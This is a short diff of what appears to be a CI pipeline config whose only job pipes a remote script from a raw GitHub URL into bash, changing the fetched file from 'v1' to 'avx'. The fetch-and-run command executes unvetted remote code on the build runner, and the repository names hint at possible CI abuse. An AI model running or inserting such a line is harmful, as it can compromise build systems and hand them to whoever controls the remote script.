@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v1 | bash'
+            - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/avx | bash'
